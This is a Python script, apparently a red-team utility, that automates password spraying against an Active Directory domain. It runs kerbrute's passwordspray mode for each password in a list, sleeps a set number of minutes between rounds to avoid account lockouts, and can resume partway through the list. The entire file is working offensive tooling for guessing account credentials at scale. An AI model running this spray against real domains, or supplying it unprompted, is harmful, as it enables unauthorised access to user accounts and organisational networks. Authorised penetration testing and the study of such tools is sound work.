import argparse
import os
import shutil
import subprocess
import sys
import time

# This script assumes you have kerbrute in /usr/local/bin/. It used kerbrute to spray a list of passwords, and wait a given amount of time in between each run.
# I made this script to make password spraying more efficient and safer.
# Recommended to add | tee -a passwordspray.log

parser = argparse.ArgumentParser(description="Password sprayer using Kerbrute.",
                                 formatter_class=argparse.ArgumentDefaultsHelpFormatter)
parser.add_argument("--users", required=True, help="Path to username list.")
parser.add_argument("--passwords", required=True, help="Path to password list.")
parser.add_argument("--sleep", type=int, default=120, help="Minutes to sleep in between password sprays.")
parser.add_argument("--domain", required=True, help="Domain name.")
parser.add_argument("--domain-ip", default="", help="Domain IP address.")
parser.add_argument("--pwd-line", type=int, default=0, help="Line number of password to resume from (0 = start)")
parser.add_argument("--attempts", default=1, type=int, help="Number of attempts before sleeping.")

args = parser.parse_args()

kerbrute_path = shutil.which("kerbrute")
if not kerbrute_path or not os.access(kerbrute_path, os.X_OK):
    print("Kerbrute is not installed or executable. Install it from https://github.com/ropnop/kerbrute "
          "or update this script to call the program from a custom path.")
    sys.exit(1)

p = args.passwords
s = args.sleep
u = args.users
d = args.domain
ip = args.domain_ip
a = args.attempts
minutes = s*60
i = 0
j = args.pwd_line

with open (p) as passwords:
    for _ in range(j):
        passwords.readline()
    
    while True:
        password = passwords.readline()
        if not password:
            print("All passwords have been sprayed. Exiting...")
            break
        password = password.strip()
        
        try:
            if ip != "":
                subprocess.run([kerbrute_path, "passwordspray" , "-d", d, "--dc", ip, u , password], check=True)
            else:
                subprocess.run([kerbrute_path, "passwordspray" , "-d", d, u , password], check=True)
        except subprocess.CalledProcessError as e:
            print(f"[!] Kerbrute error: {e}")
            continue
        
        print(f"[Processed: {j}] Sprayed password: {password}")
        sys.stdout.flush()
        
        i += 1
        j += 1
        if i == a:
            i = 0
            print(f"Sleeping for {s} minute(s) after {a} attempt(s)...")
            print(f"Resume with --pwd-line {j} if interrupted")
            sys.stdout.flush()
            
            remaining_time = minutes
            while remaining_time > 0:
                mins, secs = divmod(remaining_time, 60)
                time_format = f"{mins:02d}:{secs:02d}"
                print(f"\rTime remaining: {time_format}", end="", flush=True)
                time.sleep(1)
                remaining_time -= 1
                
            print("\nResuming password spray...")
